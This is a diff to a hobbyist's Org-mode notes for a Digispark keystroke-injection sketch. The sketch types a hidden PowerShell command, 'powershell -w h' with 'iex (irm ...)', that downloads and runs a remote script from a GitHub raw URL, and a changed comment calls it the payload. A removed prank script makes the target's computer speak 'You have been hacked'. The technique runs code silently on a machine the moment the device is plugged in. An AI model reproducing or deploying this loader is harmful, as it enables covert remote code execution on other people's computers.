@@ -2,7 +2,7 @@
 #+auto_tangle: t
 
 
-* Inhoud :toc:
+:toc:
 - [[#about][About]]
 - [[#execute_powershell_scriptino][Execute_Powershell_Script.ino]]
 - [[#scriptps1][script.ps1]]
@@ -32,7 +32,7 @@ void loop() {
   // Writes the command
   DigiKeyboard.print("powershell -w h ");
   DigiKeyboard.print("iex (irm \"");
-  DigiKeyboard.print("https://raw.githubusercontent.com/Prutserdt/dotfiles/master/Stack/Code/Powershell/script.ps1");  // LINK HERE
+  DigiKeyboard.print("https://raw.githubusercontent.com/Prutserdt/dotfiles/master/Stack/Code/Powershell/script.ps1");  // The payload is here :-)
   DigiKeyboard.print("\")");
   // Enters it
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -41,14 +41,11 @@ void loop() {
 }
 #+end_src
 
-Add-Type -AssemblyName System.speech
-$s = New-Object System.Speech.Synthesis.SpeechSynthesizer
-$s.Speak("You have been hacked. Please wave for the camera")
 
 
 
 * script.ps1
-The next code block is my current script that is deployed by my Digispark.
+The next code block is my current script that is deployed by my Digispark and hosted on Github.
 
 
 #+begin_src shell :tangle script.ps1
